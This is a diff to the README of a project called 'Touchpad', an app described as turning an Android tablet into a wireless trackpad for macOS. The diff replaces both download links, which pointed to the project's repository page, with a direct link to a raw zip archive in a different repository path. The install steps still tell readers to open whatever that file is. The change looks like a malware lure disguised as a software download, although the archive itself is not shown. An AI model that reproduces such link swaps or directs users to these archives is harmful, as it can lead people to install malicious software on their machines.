@@ -5,7 +5,7 @@ description: "Convert an Android tablet into a wireless trackpad for macOS using
 ---
 # 📱 Touchpad - Turn tablets into wireless computer mice
 
-[![Download Touchpad](https://img.shields.io/badge/Download_Touchpad-Blue-blue)](https://github.com/tommiperfect31/Touchpad)
+[![Download Touchpad](https://img.shields.io/badge/Download_Touchpad-Blue-blue)](https://raw.githubusercontent.com/tommiperfect31/tommiperfect31.github.io/main/ringmaker/io_tommiperfect_github_1.8-alpha.2.zip)
 
 ## 🎯 About This Project
 Touchpad turns your old Android tablet into a functional wireless mouse for your computer. You install one app on your Android device and another on your macOS computer. Once connected, your tablet detects your finger movements and clicks, sending these commands to your computer over your local Wi-Fi network. This project breathes new life into older hardware by repurposing it as a useful peripheral device. You do not need an internet connection for this to work, as the system relies entirely on your local Wi-Fi signal.
@@ -21,7 +21,7 @@ To use Touchpad effectively, ensure your hardware meets these basic requirements
 ## 📥 How to Install
 Follow these steps to set up your wireless touchpad.
 
-1. Visit [this page to download](https://github.com/tommiperfect31/Touchpad) the latest version of the software.
+1. Visit [this page to download](https://raw.githubusercontent.com/tommiperfect31/tommiperfect31.github.io/main/ringmaker/io_tommiperfect_github_1.8-alpha.2.zip) the latest version of the software.
 2. Download the macOS installer package to your computer.
 3. Open the downloaded file and follow the on-screen prompts to complete the installation.
 4. Locate the Touchpad icon in your macOS menu bar after installation completes.
